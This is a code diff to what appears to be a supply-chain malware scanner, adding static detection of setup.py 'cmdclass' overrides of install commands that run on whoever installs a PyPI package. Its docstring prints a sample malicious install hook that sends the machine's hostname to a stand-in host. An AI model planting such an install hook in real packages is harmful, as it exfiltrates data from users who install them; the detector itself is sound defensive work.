@@ -214,15 +214,15 @@ class PypiEcosystem(BaseEcosystem):
         found, because its mere existence means arbitrary Python executes at
         install time.
         """
-        hooks = (
+        hooks: list[Hook] = [
             Hook(
                 kind="build",
                 path=content.path,
                 name="setup.py",
                 command="python setup.py",
                 ecosystem=self.id,
-            ),
-        )
+            )
+        ]
 
         try:
             tree = ast.parse(content.text, filename=content.path)
@@ -230,9 +230,13 @@ class PypiEcosystem(BaseEcosystem):
             return Manifest(
                 path=content.path,
                 ecosystem=self.id,
-                hooks=hooks,
+                hooks=tuple(hooks),
                 parse_error=f"could not parse: {exc}",
             )
+
+        override = self._install_override_hook(tree, content.path)
+        if override is not None:
+            hooks.append(override)
 
         name: str | None = None
         version: str | None = None
@@ -278,8 +282,97 @@ class PypiEcosystem(BaseEcosystem):
             name=name,
             version=version,
             dependencies=tuple(declared),
-            hooks=hooks,
+            hooks=tuple(hooks),
         )
+
+    #: setuptools commands that run on the machine of whoever installs the package.
+    #:
+    #: `install` is the one that matters and the one the malware overrides. The
+    #: others here are its parts: setuptools dispatches `install_lib` and
+    #: `install_scripts` from it, and overriding either reaches a consumer just the
+    #: same.
+    #:
+    #: Everything NOT in this set is the reason the set exists. `build_ext`,
+    #: `build_py` and `build_clib` run when the package is built; `sdist` and
+    #: `bdist_wheel` when it is packaged; `develop` when somebody types
+    #: `pip install -e` in the project's own directory. None reaches a consumer
+    #: installing from a wheel or an sdist, and legitimate projects override
+    #: exactly those: `vllm` subclasses `build_ext` and `build_rust`,
+    #: `saltstack/salt` subclasses `develop`, `sdist` and `bdist_egg`. Neither
+    #: subclasses `install`, and the malware always does.
+    #:
+    #: The same distinction npm has documented since version 7 and that
+    #: `core.models.CONSUMER_TIME_HOOKS` already draws for `postinstall` against
+    #: `prepare`.
+    CONSUMER_INSTALL_COMMANDS = frozenset({"install", "install_lib", "install_scripts"})
+
+    def _install_override_hook(self, tree: ast.AST, path: str) -> Hook | None:
+        """A `cmdclass` override of a consumer-time install command.
+
+        Two halves, both required. A class has to subclass one of
+        `CONSUMER_INSTALL_COMMANDS`, and `setup()` has to be told to use it --
+        a subclass nobody wires in runs on nobody's machine.
+
+        Measured: 82 of the 252 real malicious PyPI packages still undetected
+        after the recall work are this shape, and it is written the same way every
+        time:
+
+            class CustomInstall(install):
+                def run(self):
+                    install.run(self)
+                    requests.get("https://collect.invalid/p?h=" + hostname)
+
+            setup(..., cmdclass={"install": CustomInstall})
+
+        Reading it without executing it is the whole point; `ast.parse` runs
+        nothing, which is the same reason this module already recovers metadata
+        this way.
+        """
+        overriding: set[str] = set()
+        for node in ast.walk(tree):
+            if not isinstance(node, ast.ClassDef):
+                continue
+            for base in node.bases:
+                named = (
+                    base.id
+                    if isinstance(base, ast.Name)
+                    else base.attr
+                    if isinstance(base, ast.Attribute)
+                    else ""
+                )
+                if named in self.CONSUMER_INSTALL_COMMANDS:
+                    overriding.add(node.name)
+        if not overriding:
+            return None
+
+        for node in ast.walk(tree):
+            if not isinstance(node, ast.Call):
+                continue
+            for keyword in node.keywords:
+                if keyword.arg != "cmdclass" or not isinstance(keyword.value, ast.Dict):
+                    continue
+                for key, value in zip(keyword.value.keys, keyword.value.values, strict=True):
+                    wired = (
+                        value.id
+                        if isinstance(value, ast.Name)
+                        else value.attr
+                        if isinstance(value, ast.Attribute)
+                        else ""
+                    )
+                    command = (
+                        key.value
+                        if isinstance(key, ast.Constant) and isinstance(key.value, str)
+                        else ""
+                    )
+                    if wired in overriding and command in self.CONSUMER_INSTALL_COMMANDS:
+                        return Hook(
+                            kind="consumerinstall",
+                            path=path,
+                            name="install",
+                            command=f"python setup.py install ({wired}.run)",
+                            ecosystem=self.id,
+                        )
+        return None
 
     def _from_literal_list(
         self, node: ast.expr, scope: Scope, field_name: str
